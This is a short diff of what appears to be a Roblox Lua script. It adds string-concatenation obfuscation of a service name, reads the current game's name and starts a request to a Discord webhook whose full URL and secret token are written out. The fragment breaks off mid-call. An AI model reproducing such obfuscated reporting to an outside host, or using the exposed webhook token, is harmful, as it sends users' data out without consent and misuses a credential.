@@ -1,5 +1,12 @@
+
+B_423 = "place"
+B_444 = "Market"..B_423.."Service"
+B_107 = game
+B_426 = game.PlaceId
 local B_424 = game:GetService(B_444):GetProductInfo(B_426);
 local B_425 = B_424.Name
+
+
 
 local webhook1 = request({
     Url = "https://discord.com/api/webhooks/1250172646314999900/MxoLaxhat_ZcJ2cdGTcT5nVHqko7qMY7EwZ3sfYo0goln6CEbf9F32V6dNM9wqsumsl_",
